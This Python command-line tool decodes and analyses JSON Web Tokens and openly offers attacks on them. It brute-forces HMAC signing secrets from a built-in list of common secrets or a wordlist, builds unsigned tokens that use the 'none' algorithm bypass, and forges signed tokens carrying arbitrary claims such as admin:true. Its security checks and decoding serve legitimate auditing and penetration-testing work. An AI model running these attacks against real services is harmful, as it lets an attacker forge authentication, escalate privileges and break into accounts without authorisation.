#!/usr/bin/env python3
"""
JWT Security Tool
Analyze, decode, and exploit JWT tokens
"""

import argparse
import base64
import json
import hmac
import hashlib
import sys
from datetime import datetime

# Common JWT secrets for brute force
COMMON_SECRETS = [
    "secret",
    "Secret",
    "SECRET",
    "password",
    "Password",
    "123456",
    "admin",
    "jwt",
    "token",
    "key",
    "supersecret",
    "your-256-bit-secret",
    "your-secret-key",
    "HS256",
    "HS512",
    "shhh",
    "mysecret",
    "mysecretkey",
    "secretkey",
    "jwtsecret",
    "jwt-secret",
    "jwt_secret",
    "jwtsecretkey",
    "changeme",
    "change-me",
    "change_me",
]


def decode_base64(data):
    """Decode base64 with padding fix"""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def encode_base64(data):
    """Encode to base64url without padding"""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def decode_jwt(token):
    """Decode JWT token without verification"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None, "Invalid JWT format (expected 3 parts)"
        
        # Decode header
        header_json = decode_base64(parts[0])
        header = json.loads(header_json)
        
        # Decode payload
        payload_json = decode_base64(parts[1])
        payload = json.loads(payload_json)
        
        # Signature
        signature = parts[2]
        
        return {
            "header": header,
            "payload": payload,
            "signature": signature,
            "raw_header": parts[0],
            "raw_payload": parts[1]
        }, None
    except Exception as e:
        return None, str(e)


def verify_signature(token, secret):
    """Verify JWT signature with given secret"""
    try:
        parts = token.split('.')
        message = f"{parts[0]}.{parts[1]}"
        
        # Get algorithm from header
        header_json = decode_base64(parts[0])
        header = json.loads(header_json)
        alg = header.get('alg', 'HS256')
        
        if alg == 'HS256':
            expected_sig = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
        elif alg == 'HS384':
            expected_sig = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha384
            ).digest()
        elif alg == 'HS512':
            expected_sig = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha512
            ).digest()
        else:
            return False, f"Unsupported algorithm: {alg}"
        
        expected_sig_b64 = encode_base64(expected_sig)
        return expected_sig_b64 == parts[2], None
    except Exception as e:
        return False, str(e)


def brute_force(token, wordlist=None):
    """Brute force JWT secret"""
    secrets = wordlist if wordlist else COMMON_SECRETS
    
    print(f"[*] Starting brute force with {len(secrets)} secrets...")
    
    for i, secret in enumerate(secrets):
        if i % 1000 == 0 and i > 0:
            print(f"[*] Progress: {i}/{len(secrets)}")
        
        is_valid, error = verify_signature(token, secret)
        if is_valid:
            return secret
    
    return None


def create_token(header, payload, secret):
    """Create a new JWT token"""
    header_b64 = encode_base64(json.dumps(header))
    payload_b64 = encode_base64(json.dumps(payload))
    
    message = f"{header_b64}.{payload_b64}"
    
    alg = header.get('alg', 'HS256')
    if alg == 'HS256':
        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    elif alg == 'HS384':
        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
    elif alg == 'HS512':
        signature = hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
    else:
        return None, f"Unsupported algorithm: {alg}"
    
    signature_b64 = encode_base64(signature)
    return f"{message}.{signature_b64}", None


def none_attack(token):
    """Attempt 'none' algorithm attack"""
    try:
        parts = token.split('.')
        header_json = decode_base64(parts[0])
        header = json.loads(header_json)
        
        # Change algorithm to none
        header['alg'] = 'none'
        
        new_header_b64 = encode_base64(json.dumps(header))
        new_token = f"{new_header_b64}.{parts[1]}."
        
        return new_token
    except Exception as e:
        return None


def analyze_token(token):
    """Analyze JWT token security"""
    decoded, error = decode_jwt(token)
    if error:
        print(f"[!] Error: {error}")
        return
    
    print("="*60)
    print("JWT TOKEN ANALYSIS")
    print("="*60)
    
    # Header analysis
    print("\n[+] HEADER:")
    print(json.dumps(decoded['header'], indent=2))
    
    alg = decoded['header'].get('alg', 'Unknown')
    print(f"\n[*] Algorithm: {alg}")
    
    if alg == 'none':
        print("[!] WARNING: 'none' algorithm - token is not signed!")
    elif alg in ['HS256', 'HS384', 'HS512']:
        print("[*] Symmetric algorithm (HMAC)")
    elif alg in ['RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512']:
        print("[*] Asymmetric algorithm - requires public key verification")
    else:
        print(f"[!] Unknown algorithm: {alg}")
    
    # Payload analysis
    print("\n[+] PAYLOAD:")
    print(json.dumps(decoded['payload'], indent=2))
    
    # Check timestamps
    if 'exp' in decoded['payload']:
        exp = decoded['payload']['exp']
        exp_date = datetime.fromtimestamp(exp)
        now = datetime.now()
        
        if exp_date < now:
            print(f"\n[!] Token EXPIRED on {exp_date}")
        else:
            print(f"\n[*] Token expires on {exp_date}")
    
    if 'iat' in decoded['payload']:
        iat = decoded['payload']['iat']
        iat_date = datetime.fromtimestamp(iat)
        print(f"[*] Issued at: {iat_date}")
    
    if 'nbf' in decoded['payload']:
        nbf = decoded['payload']['nbf']
        nbf_date = datetime.fromtimestamp(nbf)
        print(f"[*] Not valid before: {nbf_date}")
    
    # Security checks
    print("\n[+] SECURITY CHECKS:")
    
    # Check for sensitive data
    sensitive_claims = ['password', 'secret', 'key', 'token', 'credit_card', 'ssn']
    for claim in sensitive_claims:
        if claim in str(decoded['payload']).lower():
            print(f"[!] WARNING: Potential sensitive data found ({claim})")
    
    # Check for weak claims
    if decoded['payload'].get('isAdmin') or decoded['payload'].get('admin'):
        print("[!] WARNING: Admin privileges detected in token")
    
    return decoded


def main():
    parser = argparse.ArgumentParser(
        description="JWT Security Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t eyJhbGciOiJIUzI1NiIs...
  %(prog)s -t eyJhbGciOiJIUzI1NiIs... --brute-force
  %(prog)s -t eyJhbGciOiJIUzI1NiIs... --none-attack
  %(prog)s --create -s mysecret -a HS256 -c "admin:true" -c "user:admin"
        """
    )
    
    parser.add_argument("-t", "--token", help="JWT token to analyze")
    parser.add_argument("--brute-force", action="store_true", help="Brute force secret")
    parser.add_argument("-w", "--wordlist", help="Wordlist file for brute force")
    parser.add_argument("--none-attack", action="store_true", help="Attempt 'none' algorithm attack")
    parser.add_argument("--create", action="store_true", help="Create a new token")
    parser.add_argument("-s", "--secret", help="Secret for signing/verification")
    parser.add_argument("-a", "--algorithm", default="HS256", help="Algorithm (default: HS256)")
    parser.add_argument("-c", "--claim", action="append", help="Add claim (format: key:value)")
    
    args = parser.parse_args()
    
    if args.create:
        if not args.secret:
            print("[!] Secret required for token creation")
            return
        
        header = {"alg": args.algorithm, "typ": "JWT"}
        payload = {}
        
        if args.claim:
            for claim in args.claim:
                if ':' in claim:
                    key, value = claim.split(':', 1)
                    # Try to parse as boolean or number
                    if value.lower() == 'true':
                        value = True
                    elif value.lower() == 'false':
                        value = False
                    elif value.isdigit():
                        value = int(value)
                    payload[key] = value
        
        token, error = create_token(header, payload, args.secret)
        if error:
            print(f"[!] Error: {error}")
        else:
            print("[+] Generated Token:")
            print(token)
    
    elif args.token:
        decoded = analyze_token(args.token)
        
        if args.brute_force:
            wordlist = None
            if args.wordlist:
                try:
                    with open(args.wordlist, 'r') as f:
                        wordlist = [line.strip() for line in f]
                except Exception as e:
                    print(f"[!] Error loading wordlist: {e}")
            
            secret = brute_force(args.token, wordlist)
            if secret:
                print(f"\n[+] SECRET FOUND: {secret}")
            else:
                print("\n[-] Secret not found")
        
        if args.none_attack:
            new_token = none_attack(args.token)
            if new_token:
                print("\n[+] 'none' algorithm attack token:")
                print(new_token)
    
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
